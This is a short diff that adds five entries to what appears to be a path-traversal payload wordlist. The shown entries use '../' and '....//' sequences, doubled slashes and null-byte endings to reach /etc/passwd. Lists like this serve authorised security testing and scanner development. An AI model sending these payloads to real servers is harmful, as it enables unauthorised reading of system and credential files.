@@ -21,6 +21,11 @@
 ../../../../../..//etc/passwd
 ../../../../../../..//etc/passwd
 ../../../../../../../..//etc/passwd
+//etc/passwd
+//....//etc/passwd
+//....//....//etc/passwd
+//....//....//....//etc/passwd
+//....//....//....//....//etc/passwd
 /etc/passwd%2500
 /etc/passwd%00
 /etc/passwd
